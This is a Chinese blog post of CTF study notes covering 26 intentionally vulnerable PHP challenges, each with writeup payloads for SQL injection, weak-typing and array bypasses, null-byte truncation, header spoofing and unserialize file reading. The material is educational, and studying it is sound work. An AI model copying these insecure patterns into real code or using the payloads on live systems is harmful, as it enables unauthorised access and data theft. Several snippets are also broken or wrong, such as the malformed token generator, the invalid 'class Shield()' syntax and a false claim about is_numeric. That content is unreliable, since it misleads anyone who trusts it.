---
title: CTF中常见PHP特性学习笔记
published: 2021-04-15 17:07
tags: [CTF, PHP, 代码审计]
category: CTF
draft: false
---

# CTF中常见PHP特性学习笔记

## 01 extract变量覆盖

**code**

```php
<?php
$flag='xxx'; 
extract($_GET);
 if(isset($shiyan))
 { 
    $content=trim(file_get_contents($flag));
    if($shiyan==$content)
    { 
        echo'ctf{xxx}'; 
    }
   else
   { 
    echo'Oh.no';
   } 
   }
?>
```

**writeup**

资料：

- [PHP extract() 函数](http://www.w3school.com.cn/php/func_array_extract.asp)

```
http://localhost/php_bugs/extract1.php?shiyan=&flag=1
```

![](/images/posts/php-ctf-features/1.png)

## 02 绕过trim函数过滤

**code**

```php
<?php
 
$info = ""; 
$req = [];
$flag="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
 
ini_set("display_error", false); //为一个配置选项设置值
error_reporting(0); //关闭所有PHP错误报告
 
if(!isset($_GET['number'])){
   header("hint:26966dc52e85af40f59b4fe73d8c323a.txt"); //HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt
 
   die("have a fun!!"); //die — 等同于 exit()
 
}
 
foreach([$_GET, $_POST] as $global_var) {  //foreach 语法结构提供了遍历数组的简单方式 
    foreach($global_var as $key => $value) { 
        $value = trim($value);  //trim — 去除字符串首尾处的空白字符（或者其他字符）
        is_string($value) && $req[$key] = addslashes($value); // is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串
    } 
} 
 
 
function is_palindrome_number($number) { 
    $number = strval($number); //strval — 获取变量的字符串值
    $i = 0; 
    $j = strlen($number) - 1; //strlen — 获取字符串长度
    while($i < $j) { 
        if($number[$i] !== $number[$j]) { 
            return false; 
        } 
        $i++; 
        $j--; 
    } 
    return true; 
} 
 
 
if(is_numeric($_REQUEST['number'])) //is_numeric — 检测变量是否为数字或数字字符串 
{
 
   $info="sorry, you cann't input a number!";
 
}
elseif($req['number']!=strval(intval($req['number']))) //intval — 获取变量的整数值
{
 
     $info = "number must be equal to it's integer!! ";  
 
}
else
{
 
     $value1 = intval($req["number"]);
     $value2 = intval(strrev($req["number"]));  
 
     if($value1!=$value2){
          $info="no, this is not a palindrome number!";
     }
     else
     {
 
          if(is_palindrome_number($req["number"])){
              $info = "nice! {$value1} is a palindrome number!"; 
          }
          else
          {
             $info=$flag;
          }
     }
 
}
 
echo $info;
```



**writeup**

由于`is_numeric`没有检测`\0(%00)`，所以导致`is_numeric($_REQUEST['number'])`为`False`，成功跳过检测。

![](/images/posts/php-ctf-features/2.jpg)

由于trim函数没有过滤`\f(%0c)`，而`intval`函数而跳过`\f(%0c)`，导致`$value1`和`$value2`都为相等，进入到`is_palindrome_number`函数成功通过`$number[$i] !== $number[$j]`检测返回`false`，最终进入到获取`$flag`最后的`else`里。

![](/images/posts/php-ctf-features/3.jpg)

```
http://localhost/php_bugs/02.php?number=%0c1
```

资料

- [PHP类型与逻辑+fuzz与源代码审计](http://www.chnpanda.com/961.html)

## 03 多重加密

**code**

```php
<?php
    include 'common.php';
    $requset = array_merge($_GET, $_POST, $_COOKIE);
    //把一个或多个数组合并为一个数组
    class db
    {
        public $where;
        function __wakeup()
        {
            if(!empty($this->where))
            {
                $this->select($this->where);
            }
        }
        function select($where)
        {
            $sql = mysql_query('select * from user where '.$where);
            //函数执行一条 MySQL 查询。
            return @mysql_fetch_array($sql);
            //从结果集中取得一行作为关联数组，或数字数组，或二者兼有返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false
        }
    }

    if(isset($requset['token']))
    //测试变量是否已经配置。若变量已存在则返回 true 值。其它情形返回 false 值。
    {
        $login = unserialize(gzuncompress(base64_decode($requset['token'])));
        //gzuncompress:进行字符串压缩
        //unserialize: 将已序列化的字符串还原回 PHP 的值

        $db = new db();
        $row = $db->select('user=\''.mysql_real_escape_string($login['user']).'\'');
        //mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。

        if($login['user'] === 'ichunqiu')
        {
            echo $flag;
        }else if($row['pass'] !== $login['pass']){
            echo 'unserialize injection!!';
        }else{
            echo "(╯‵□′)╯︵┴─┴ ";
        }
    }
    // else{
    //     header('Location: index.php?error=1');
    // }

?>
```

**writeup**

```php
<?php
$arr = array(['user'] === 'ichunqiu');
$token = base64_encode(gzcompress(serialize($arr)));
print_r($token);
?>
eJxLtDK0qs60MrBOAuJaAB5uBBQ=
http://127.0.0.1/php_bugs/03.php?token=eJxLtDK0qs60MrBOAuJaAB5uBBQ=
```

## 04 SQL注入WITH ROLLUP绕过

**code**

```php
<?php
error_reporting(0);

if (!isset($_POST['uname']) || !isset($_POST['pwd'])) {
    echo '<form action="" method="post">'."<br/>";
    echo '<input name="uname" type="text"/>'."<br/>";
    echo '<input name="pwd" type="text"/>'."<br/>";
    echo '<input type="submit" />'."<br/>";
    echo '</form>'."<br/>";
    echo '<!--source: source.txt-->'."<br/>";
    die;
}

function AttackFilter($StrKey,$StrValue,$ArrReq){  
    if (is_array($StrValue)){

//检测变量是否是数组

        $StrValue=implode($StrValue);

//返回由数组元素组合成的字符串

    }
    if (preg_match("/".$ArrReq."/is",$StrValue)==1){   

//匹配成功一次后就会停止匹配

        print "水可载舟，亦可赛艇！";
        exit();
    }
}

$filter = "and|select|from|where|union|join|sleep|benchmark|,|\(|\)";
foreach($_POST as $key=>$value){ 

//遍历数组

    AttackFilter($key,$value,$filter);
}

$con = mysql_connect("localhost","root","root");
if (!$con){
    die('Could not connect: ' . mysql_error());
}
$db="test";
mysql_select_db($db, $con);

//设置活动的 MySQL 数据库

$sql="SELECT * FROM interest WHERE uname = '{$_POST['uname']}'";
echo $sql;
echo "</br>";
$query = mysql_query($sql); 

//执行一条 MySQL 查询
var_dump(mysql_num_rows($query));
echo "</br>";
if (mysql_num_rows($query) == 1) { 

//返回结果集中行的数目

    $key = mysql_fetch_array($query);

//返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false

    if($key['pwd'] == $_POST['pwd']) {
        print "CTF{XXXXXX}";
    }else{
        print "亦可赛艇！";
    }
}else{
    print "一颗赛艇！";
}
mysql_close($con);
?>
```

**writeup**

资料：

- [实验吧 因缺思汀的绕过 By Assassin（with rollup统计）](http://blog.csdn.net/qq_35078631/article/details/54772798)
- [使用 GROUP BY WITH ROLLUP 改善统计性能](http://blog.csdn.net/id19870510/article/details/6254358)
- [因缺思汀的绕过](http://www.bubuko.com/infodetail-2169730.html)

```
pwd&uname=admin' group by pwd with rollup limit 1 offset 1#--
```

![](/images/posts/php-ctf-features/4.png)

![](/images/posts/php-ctf-features/5.png)

## 05 ereg正则%00截断

**code**

```php
<?php 

$flag = "flag";

if (isset ($_GET['password'])) 
{
  if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
  {
    echo '<p>You password must be alphanumeric</p>';
  }
  else if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999)
   {
     if (strpos ($_GET['password'], '*-*') !== FALSE) //strpos — 查找字符串首次出现的位置
      {
      die('Flag: ' . $flag);
      }
      else
      {
        echo('<p>*-* have not been found</p>'); 
       }
      }
     else 
     {
        echo '<p>Invalid password</p>'; 
      }
   } 
?>
```

**writeup**

资料：

- [eregi()](http://www.am0s.com/functions/203.html)

```
http://localhost/php_bugs/05.php?password=1e9%00*-*
```

## 06 strcmp比较字符串

**code**

```php
<?php
$flag = "flag";
if (isset($_GET['a'])) {  
    if (strcmp($_GET['a'], $flag) == 0) //如果 str1 小于 str2 返回 < 0； 如果 str1大于 str2返回 > 0；如果两者相等，返回 0。 

    //比较两个字符串（区分大小写） 
        die('Flag: '.$flag);  
    else  
        print 'No';  
}

?>
```



**writeup**

```c
int strcmp ( string $str1 , string $str2 )
// 参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 < 0； 如果 str1 大于 str2 返回 > 0；如果两者相等，返回 0。
```

在PHP官方文档中，说明了strcmp函数在5.2版本和5.3版本的区别。

> Note a difference between 5.2 and 5.3 versions
>
> echo (int)strcmp(‘pending’,array());
> will output -1 in PHP 5.2.16 (probably in all versions prior 5.3)
> but will output 0 in PHP 5.3.3
>
> Of course, you never need to use array as a parameter in string comparisions.

5.3之前版本如果传入数组参数strcmp函数将会返回-1：

![](/images/posts/php-ctf-features/6.png)

在5.3.3版本之后使用这个函数传入数组参数比较会返回0，也就是判定其相等，后来PHP官方后面的版本中修复了这个漏洞，当传入非字符串参数导致报错的时函数不返回任何值，也就是返回`NULL`，但是由于这里`==`弱类型判断，导致`NULL==0`为 `bool(true)`。

```
http://localhost/php_bugs/06.php?a[]=1
```

![](/images/posts/php-ctf-features/7.png)

## 07 sha()函数比较绕过

**code**

```php
<?php

$flag = "flag";

if (isset($_GET['name']) and isset($_GET['password'])) 
{
    var_dump($_GET['name']);
    echo "</br>";
    var_dump($_GET['password']);
    var_dump(sha1($_GET['name']));
    var_dump(sha1($_GET['password']));
    if ($_GET['name'] == $_GET['password'])
        echo '<p>Your password can not be your name!</p>';
    else if (sha1($_GET['name']) === sha1($_GET['password']))
      die('Flag: '.$flag);
    else
        echo '<p>Invalid password.</p>';
}
else
    echo '<p>Login first!</p>';
?>
```



**writeup**

由于`sha1()`函数和`md5()`函数在处理传入参数为数组时会报警并都返回`NULL`，构造并传入2个不同数组便可以成功通过`if ($_GET['name'] == $_GET['password'])`和`else if (sha1($_GET['name']) === sha1($_GET['password']))`检测。

```
http://localhost/php_bugs/07.php?name[]=1&password[]=2
```

![](/images/posts/php-ctf-features/8.png)

## 08 SESSION验证绕过

```php
<html>  
<head>  
    <title>Get flag</title>
</head>  
<body>  
 
<?php  
session_start();   
  
require 'flag.php';  
  
if (isset ($_GET['password'])) {  
    if ($_GET['password'] == $_SESSION['password'])  
        die ('Flag: '.$flag);  
    else  
        print '<p class="alert">Wrong guess.</p>';  
}  
  
// Unpredictable seed  
mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));  
?>  
  
<section class="login">    
        <ul class="list">  
        <?php  
        for ($i=0; $i<3; $i++)  
            print '<li>' . mt_rand (0, 0xffffff) . '</li>';  
        $_SESSION['password'] = mt_rand (0, 0xffffff);  
        ?>  
        </ul>  
  
        <form method="get">  
                <input type="text" required name="password" placeholder="Next number" /><br/>  
                <input type="submit"/>  
        </form>  
</section>  
</body>  
</html>
```

**writeup**

关键判断语句`if ($_GET['password'] == $_SESSION['password'])`，可以手动删除请求时的`cookies`，使`$_SESSION['password']`字段为`NULL`，并使传入`password`参数为`NULL`。

```
http://localhost/php_bugs/08.php?password=
```

![](/images/posts/php-ctf-features/9.png)

![](/images/posts/php-ctf-features/10.png)

资料：

- [【Writeup】Boston Key Party CTF 2015(部分题目)](http://blog.csdn.net/lymingha0/article/details/44079981)

## 09 密码md5比较绕过

**code**

```php
<?php

//配置数据库
if($_POST[user] && $_POST[pass]) {
    $conn = mysql_connect("localhost", "root", "root");
    mysql_select_db("test") or die("Could not select database");
    if ($conn->connect_error) {
        die("Connection failed: " . mysql_error($conn));
}

//赋值

$user = $_POST[user];
$pass = md5($_POST[pass]);

//sql语句

$sql = "select pwd from test where user='$user'";
$query = mysql_query($sql);
if (!$query) {
    printf("Error: %s\n", mysql_error($conn));
    exit();
}
$row = mysql_fetch_array($query, MYSQL_ASSOC);

  if (($row[pwd]) && (!strcasecmp($pass, $row[pwd]))) {

//如果 str1 小于 str2 返回 < 0； 如果 str1 大于 str2 返回 > 0；如果两者相等，返回 0。


    echo "<p>Logged in! Key:************** </p>";
}
else {
    echo("<p>Log in failure!</p>");

  }
}
?>
```



**writeup**

![](/images/posts/php-ctf-features/11.png)

```
?user=' union select 'e10adc3949ba59abbe56e057f20f883e' #&pass=123456
```

资料：

- [DUTCTF-2015-Writeup](http://bobao.360.cn/ctf/learning/129.html)

## 10 urldecode二次编码绕过

**code**

```
<?php
if(eregi("hackerDJ",$_GET[id])) {
  echo("<p>not allowed!</p>");
  exit();
}

$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "hackerDJ")
{
  echo "<p>Access granted!</p>";
  echo "<p>flag: {*****************} </p>";
}
?>
```



`h`的`URL`编码为：`%68`，二次编码为`%2568`，绕过

```
http://localhost/php_bugs/10.php?id=%2568ackerDJ
```

资料：

- [URL编码表](https://baike.baidu.com/item/URL编码/3703727?fr=aladdin)

## 11 sql闭合绕过

**code**

```php
<?php
if($_POST[user] && $_POST[pass]) {
    $conn = mysql_connect("localhost", "root", "root");
    mysql_select_db("test") or die("Could not select database");
    if ($conn->connect_error) {
        die("Connection failed: " . mysql_error($conn));
} 
$user = $_POST[user];
$pass = md5($_POST[pass]);

//exp:pass=1&user=admin')#
//sql:select user from test where (user='admin')#

$sql = "select user from test where (user='$user') and (pwd='$pass')";
echo $sql;
$query = mysql_query($sql);
if (!$query) {
    printf("Error: %s\n", mysql_error($conn));
    exit();
}
$row = mysql_fetch_array($query, MYSQL_ASSOC);
//echo $row["pwd"];
  if($row['user']=="admin") {
    echo "<p>Logged in! Key: *********** </p>";
  }

  if($row['user'] != "admin") {
    echo("<p>You are not admin!</p>");
  }
}

?>
```



构造exp闭合绕过
`pass=1&user=admin')#`

## 12 X-Forwarded-For绕过指定IP地址

**code**

```php
<?php
function GetIP(){
if(!empty($_SERVER["HTTP_CLIENT_IP"]))
    $cip = $_SERVER["HTTP_CLIENT_IP"];
else if(!empty($_SERVER["HTTP_X_FORWARDED_FOR"]))
    $cip = $_SERVER["HTTP_X_FORWARDED_FOR"];
else if(!empty($_SERVER["REMOTE_ADDR"]))
    $cip = $_SERVER["REMOTE_ADDR"];
else
    $cip = "0.0.0.0";
return $cip;
}

$GetIPs = GetIP();
if ($GetIPs=="1.1.1.1"){
echo "Great! Key is *********";
}
else{
echo "错误！你的IP不在访问列表之内！";
}
?>
```

**writeup**

```
HTTP`头添加`X-Forwarded-For:1.1.1.1
```

## 13 md5加密相等绕过

**code**

```php
<?php

$md51 = md5('QNKCDZO');
$a = @$_GET['a'];
$md52 = @md5($a);
if(isset($a)){
if ($a != 'QNKCDZO' && $md51 == $md52) {
    echo "flag{*****************}";
} else {
    echo "false!!!";
}}
else{echo "please input a";}

?>
```

**writeup**

```
http://localhost/php_bugs/13.php?a=240610708
```

`==`对比的时候会进行数据转换，根据PHP手册的描述：如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行。其中0e是科学计数法，因为涉及到数字内容，所以就会转换为数值，而`0e830400451993494058024219903391`转换为数值也就是`0*(10^830400451993494058024219903391) = 0`，因此只需找到生成的MD5值类似`0exxxxxxxxx`的字符串即可。

```php
md5('240610708'); // 0e462097431906509019562988736854 
md5('QNKCDZO'); // 0e830400451993494058024219903391
```

## 14 intval函数向下取整

**code**

```php
<?php
if($_GET[id]) {
    $conn = mysql_connect("localhost", "root", "root");
    mysql_select_db("test") or die("Could not select database");
    if ($conn->connect_error) {
      die("Connection failed: " . mysql_error($conn));
    }
  $id = intval($_GET[id]);
  echo $id;
  $query = @mysql_fetch_array(mysql_query("select flag from ctf where id='$id'"));
  echo $_GET[id];
  if ($_GET[id]==1024) {
    echo "<p>no! try again</p>";
  }
  else{
    echo($query[flag]);
  }
}
?>
```



`1024.1`绕过

**writeup**

![](/images/posts/php-ctf-features/12.png)

资料：

- [PHP intval()函数利用](http://blog.csdn.net/wangjian1012/article/details/51581564)

## 15 strpos数组绕过NULL与ereg正则%00截断

**code**

```php
<?php

$flag = "flag";

    if (isset ($_GET['nctf'])) {
        if (@ereg ("^[1-9]+$", $_GET['nctf']) === FALSE)
            echo '必须输入数字才行';
        else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE)   
            die('Flag: '.$flag);
        else
            echo '骚年，继续努力吧啊~';
    }

 ?>
```

**writeup**

- 方法一：
  既要是纯数字,又要有`’#biubiubiu’`，`strpos()`找的是字符串,那么传一个数组给它,`strpos()`出错返回`null,null!==false`,所以符合要求.
  所以输入`nctf[]=`
  那为什么`ereg()`也能符合呢?因为`ereg()`在出错时返回的也是`null`,`null!==false`,所以符合要求.
- 方法二：
  字符串截断,利用`ereg()`的`NULL`截断漏洞，绕过正则过滤
  `http://localhost/php_bugs/16.php?nctf=1%00#biubiubiu` 错误
  需将#编码
  `http://localhost/php_bugs/16.php?nctf=1%00%23biubiubiu`
  正确

## 16 SQL注入or绕过

**code**

```php
<?php

#GOAL: login as admin,then get the flag;
error_reporting(0);
require 'db.inc.php';

function clean($str){
    if(get_magic_quotes_gpc()){ //get_magic_quotes_gpc — 获取当前 magic_quotes_gpc 的配置选项设置
        $str=stripslashes($str); //返回一个去除转义反斜线后的字符串（\' 转换为 ' 等等）。双反斜线（\\）被转换为单个反斜线（\）。 
    }
    return htmlentities($str, ENT_QUOTES);
}

$username = @clean((string)$_GET['username']);
$password = @clean((string)$_GET['password']);

//$query='SELECT * FROM users WHERE name=\''admin\'\' AND pass=\''or 1 #'\';';

$query='SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';';
$result=mysql_query($query);
if(!$result || mysql_num_rows($result) < 1){
    die('Invalid password!');
}

echo $flag;

?>
```



**writeup**

```php
$query='SELECT * FROM users WHERE name=\''admin\'\' AND pass=\''or 1 #'\';';
?username=admin\'\' AND pass=\''or 1 #&password=
```

## 17 密码md5比较绕过

**code**

```php
<?php

if($_POST[user] && $_POST[pass]) {
   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $user = $_POST[user];
  $pass = md5($_POST[pass]);
  $query = @mysql_fetch_array(mysql_query("select pw from ctf where user=' $user '"));
  if (($query[pw]) && (!strcasecmp($pass, $query[pw]))) {

    //strcasecmp:0 - 如果两个字符串相等

      echo "<p>Logged in! Key: flag{**************} </p>";
  }
  else {
    echo("<p>Log in failure!</p>");
  }
}

?>
```



**writeup**

```php
//select pw from ctf where user=''and 0=1 union select  'e10adc3949ba59abbe56e057f20f883e' #
```



```php
?user='and 0=1 union select  'e10adc3949ba59abbe56e057f20f883e' #&pass=123456
```

## 18 md5()函数===使用数组绕过

**code**

```php
<?php
error_reporting(0);
$flag = 'flag{test}';
if (isset($_GET['username']) and isset($_GET['password'])) {
    if ($_GET['username'] == $_GET['password'])
        print 'Your password can not be your username.';
    else if (md5($_GET['username']) === md5($_GET['password']))
        die('Flag: '.$flag);
    else
        print 'Invalid password';
}
?>
```

**writeup**

若为`md5($_GET['username']) == md5($_GET['password'])`
则可以构造：
`http://localhost/php_bugs/18.php?username=QNKCDZO&password=240610708`
因为`==`对比的时候会进行数据转换，`0eXXXXXXXXXX` 转成`0`了
也可以使用数组绕过
`http://localhost/php_bugs/18.php?username[]=1&password[]=2`

但此处是`===`，只能用数组绕过，`PHP`对数组进行`hash`计算都会得出`null`的空值
`http://localhost/php_bugs/18.php?username[]=1&password[]=2`

## 19 ereg()函数strpos() 函数用数组返回NULL绕过

**code**

```php
<?php  

$flag = "flag";  
   
if (isset ($_GET['password'])) {  
    if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)  
        echo 'You password must be alphanumeric';  
    else if (strpos ($_GET['password'], '--') !== FALSE)  
        die('Flag: ' . $flag);  
    else  
        echo 'Invalid password';  
}  
?>
```



**writeup**

- 方法一：
  ereg()正则函数可以用`%00`截断
  `http://localhost/php_bugs/19.php?password=1%00--`
- 方法二：
  将`password`构造一个`arr[]`，传入之后，`ereg`是返回`NULL`的，`===`判断`NULL`和 `FALSE`，是不相等的，所以可以进入第二个判断，而`strpos`处理数组，也是返回`NULL`，注意这里的是`!==`，`NULL!==FALSE`,条件成立，拿到`flag`
  `http://localhost/php_bugs/19.php?password[]=`

## 20 十六进制与数字比较

**code**

```php
<?php

error_reporting(0);
function noother_says_correct($temp)
{
    $flag = 'flag{test}';
    $one = ord('1');  //ord — 返回字符的 ASCII 码值
    $nine = ord('9'); //ord — 返回字符的 ASCII 码值
    $number = '3735929054';
    // Check all the input characters!
    for ($i = 0; $i < strlen($number); $i++)
    { 
        // Disallow all the digits!
        $digit = ord($temp{$i});
        if ( ($digit >= $one) && ($digit <= $nine) )
        {
            // Aha, digit not allowed!
            return "flase";
        }
    }
    if($number == $temp)
        return $flag;
}
$temp = $_GET['password'];
echo noother_says_correct($temp);

?>
```



**writeup**

这里，它不让输入1到9的数字，但是后面却让比较一串数字，平常的方法肯定就不能行了，大家都知道计算机中的进制转换，当然也是可以拿来比较的，`0x`开头则表示`16`进制，将这串数字转换成`16`进制之后发现，是d`eadc0de`，在开头加上`0x`，代表这个是`16`进制的数字，然后再和十进制的 `3735929054`比较，答案当然是相同的，返回`true`拿到`flag`

```php
echo  dechex ( 3735929054 ); // 将3735929054转为16进制
结果为：deadc0de
```

构造：
`http://localhost/php_bugs/20.php?password=0xdeadc0de`

## 21 数字验证正则绕过

**code**

```php
<?php

error_reporting(0);
$flag = 'flag{test}';
if  ("POST" == $_SERVER['REQUEST_METHOD']) 
{ 
    $password = $_POST['password']; 
    if (0 >= preg_match('/^[[:graph:]]{12,}$/', $password)) //preg_match — 执行一个正则表达式匹配
    { 
        echo 'Wrong Format'; 
        exit; 
    } 
    while (TRUE) 
    { 
        $reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'; 
        if (6 > preg_match_all($reg, $password, $arr)) 
            break; 
        $c = 0; 
        $ps = array('punct', 'digit', 'upper', 'lower'); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字  [[:upper:]] 任何大写字母  [[:lower:]] 任何小写字母 
        foreach ($ps as $pt) 
        { 
            if (preg_match("/[[:$pt:]]+/", $password)) 
                $c += 1; 
        } 
        if ($c < 3) break; 
        //>=3，必须包含四种类型三种与三种以上
        if ("42" == $password) echo $flag; 
        else echo 'Wrong password'; 
        exit; 
    } 
}

?>
```

**writeup**

`0 >= preg_match('/^[[:graph:]]{12,}$/', $password)`
意为必须是12个字符以上（非空格非TAB之外的内容）

```php
$reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'; 
if (6 > preg_match_all($reg, $password, $arr))
```

意为匹配到的次数要大于6次

```php
$ps = array('punct', 'digit', 'upper', 'lower'); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字  [[:upper:]] 任何大写字母  [[:lower:]] 任何小写字母 
foreach ($ps as $pt) 
{ 
    if (preg_match("/[[:$pt:]]+/", $password)) 
        $c += 1; 
} 
if ($c < 3) break;
```

意为必须要有大小写字母，数字，字符内容三种与三种以上

```php
if ("42" == $password) echo $flag;
```

意为必须等于`42`

答案：

```php
42.00e+00000000000 
或
420.000000000e-1
```



资料：

- [安全宝「约宝妹」代码审计CTF题解](http://bobao.360.cn/learning/detail/248.html)
- [各种版本PHP在线迷你运行脚本](https://3v4l.org/jYSpC)
- [PHP Comparison Operators](http://php.net/manual/en/language.operators.comparison.php)

## 22 弱类型整数大小比较绕过

**code**

```php
<?php

error_reporting(0);
$flag = "flag{test}";

$temp = $_GET['password'];
is_numeric($temp)?die("no numeric"):NULL;    
if($temp>1336){
    echo $flag;
} 

?>
```



**writeup**

`is_numeric($temp)?die("no numeric"):NULL;`
不能是数字

```php
if($temp>1336){
    echo $flag;
}
```

又要大于`1336`

利用`PHP`弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型`intval`再比。如果输入一个`1337a`这样的字符串，在`is_numeric`中返回`true`，然后在比较时被转换成数字`1337`，这样就绕过判断输出`flag`。

```
http://localhost/php_bugs/22.php?password=1337a
```

## 23 md5函数验证绕过

**code**

```php
<?php

error_reporting(0);
$flag = 'flag{test}';
$temp = $_GET['password'];
if(md5($temp)==0){
    echo $flag;
}

?>
if(md5($temp)==0)`
要使`md5`函数加密值为`0
```

**writeup**

- 方法一：
  使`password`不赋值，为`NULL`，`NULL == 0`为`true`
  `http://localhost/php_bugs/23.php?password=`
  `http://localhost/php_bugs/23.php`
- 方法二：
  经过MD5运算后，为`0e******`的形式，其结果为`0*10`的`n`次方，结果还是零
  `http://localhost/php_bugs/23.php?password=240610708`
  `http://localhost/php_bugs/23.php?password=QNKCDZO`

## 24 md5函数true绕过注入

**code**

```php
<?php 
error_reporting(0);
$link = mysql_connect('localhost', 'root', 'root');
if (!$link) { 
  die('Could not connect to MySQL: ' . mysql_error()); 
} 
// 选择数据库
$db = mysql_select_db("security", $link);
if(!$db)
{
  echo 'select db error';
  exit();
}
// 执行sql
$password = $_GET['password'];
$sql = "SELECT * FROM users WHERE password = '".md5($password,true)."'";
var_dump($sql);
// SELECT * FROM users WHERE password = '276f722736c95d99e921722cf9ed621c'
$result=mysql_query($sql) or die('<pre>' . mysql_error() . '</pre>' );
$row1 = mysql_fetch_row($result);
var_dump($row1);
mysql_close($link);
?>
```



**writeup**

`$sql = "SELECT * FROM users WHERE password = '".md5($password,true)."'";`
`md5($password,true)`
将`md5`后的`hex`转换成字符串

如果包含`'or'xxx`这样的字符串，那整个`sql`变成

`SELECT * FROM admin WHERE pass = ''or'xxx'`就绕过了

字符串：`ffifdyop`

```php
md5`后，`276f722736c95d99e921722cf9ed621c`
`hex`转换成字符串：`'or'6<trash>
```

构造：`?password=ffifdyop`

资料：

- [PHP md5() 函数](http://www.w3school.com.cn/php/func_string_md5.asp)
- [MD5加密后的SQL 注入](http://blog.csdn.net/greyfreedom/article/details/45846137)
- [敏感函数md5()](http://www.am0s.com/functions/204.html)
- [php黑魔法](http://www.xmanblog.net/2017/04/04/php-magic/)

## 25 switch没有break 字符与0比较绕过

**code**

```php
<?php

// error_reporting(0);

if (isset($_GET['which']))
{
    $which = $_GET['which'];
    switch ($which)
    {
    case 0:
    print('arg');
    // break;
    case 1:
    case 2:
        require_once $which.'.php';
         echo $flag;
        break;
    default:
        echo GWF_HTML::error('PHP-0817', 'Hacker NoNoNo!', false);
        break;
    }
}

?>
```

**writeup**

让我们包含当前目录中的`flag.php`，给`which`为`flag`，这里会发现在`case 0`和`case 1`的时候，没有`break`，按照常规思维，应该是`0`比较不成功，进入比较`1`，然后比较`2`，再然后进入`default`，但是事实却不是这样，事实上，在 `case 0`的时候，字符串和`0`比较是相等的，进入了`case 0`的方法体，但是却没有`break`，这个时候，默认判断已经比较成功了，而如果匹配成功之后，会继续执行后面的语句，这个时候，是不会再继续进行任何判断的。也就是说，我们`which`传入`flag`的时候，`case 0`比较进入了方法体，但是没有`break`，默认已经匹配成功，往下执行不再判断，进入`2`的时候，执行了`require_once flag.php`

PHP中非数字开头字符串和数字 `0`比较`==`都返回`True`

因为通过逻辑运算符让字符串和数字比较时，会自动将字符串转换为数字.而当字符串无法转换为数字时，其结果就为`0`了，然后再和另一个`0`比大小，结果自然为`ture`。注意：如果那个字符串是以数字开头的，如`6ldb`，它还是可以转为数字`6`的，然后和`0`比较就不等了（但是和`6`比较就相等）
`if($str==0)` 判断 和 `if( intval($str) == 0 )` 是等价的

```php
可以验证：
<?php
$str="s6s";
if($str==0){ echo "返回了true.";}
?>
```

要字符串与数字判断不转类型方法有：

- 方法一：
  `$str="字符串";if($str===0){ echo "返回了true.";}`
- 方法二：
  `$str="字符串";if($str=="0"){ echo "返回了true.";} ,`

此题构造：`http://localhost/php_bugs/25.php?which=flag`

资料：

- [PHP中字符串和数字 0 比较为什么返回true？](https://zhidao.baidu.com/question/336186893.html)

## 26 unserialize()序列化

**code**

```php
<!-- 题目：http://web.jarvisoj.com:32768 -->

<!-- index.php -->
<?php 
    require_once('shield.php');
    $x = new Shield();
    isset($_GET['class']) && $g = $_GET['class'];
    if (!empty($g)) {
        $x = unserialize($g);
    }
    echo $x->readfile();
?>
<img src="showimg.php?img=c2hpZWxkLmpwZw==" width="100%"/>

<!-- shield.php -->

<?php
    //flag is in pctf.php
    class Shield {
        public $file;
        function __construct($filename = '') {
            $this -> file = $filename;
        }
        
        function readfile() {
            if (!empty($this->file) && stripos($this->file,'..')===FALSE  
            && stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
                return @file_get_contents($this->file);
            }
        }
    }
?>

<!-- showimg.php -->
<?php
    $f = $_GET['img'];
    if (!empty($f)) {
        $f = base64_decode($f);
        if (stripos($f,'..')===FALSE && stripos($f,'/')===FALSE && stripos($f,'\\')===FALSE
        //stripos — 查找字符串首次出现的位置（不区分大小写）
        && stripos($f,'pctf')===FALSE) {
            readfile($f);
        } else {
            echo "File not found!";
        }
    }
?>
```

**writeup**

说明`flag`在`pctf.php`，但`showimg.php`中不允许直接读取`pctf.php`，只有在`index.php`中可以传入变量`class`
，`index.php`中`Shield`类的实例`$X = unserialize($g)`，`$g = $_GET['class'];`，`$X`中不知`$filename`变量，但需要找的是：`$filename = "pctf.php"`，现`$X`已知，求传入的`class`变量值。
可以进行序列化操作：

```php
<!-- answer.php -->
<?php

require_once('shield.php');
$x = class Shield();
$g = serialize($x);
echo $g;

?>

<!-- shield.php -->
<?php
    //flag is in pctf.php
    class Shield {
        public $file;
        function __construct($filename = 'pctf.php') {
            $this -> file = $filename;
        }
        
        function readfile() {
            if (!empty($this->file) && stripos($this->file,'..')===FALSE  
            && stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
                return @file_get_contents($this->file);
            }
        }
    }
?>
```



得到：
`O:6:"Shield":1:{s:4:"file";s:8:"pctf.php";}`
构造：
`http://web.jarvisoj.com:32768/index.php?class=O:6:"Shield":1:{s:4:"file";s:8:"pctf.php";}`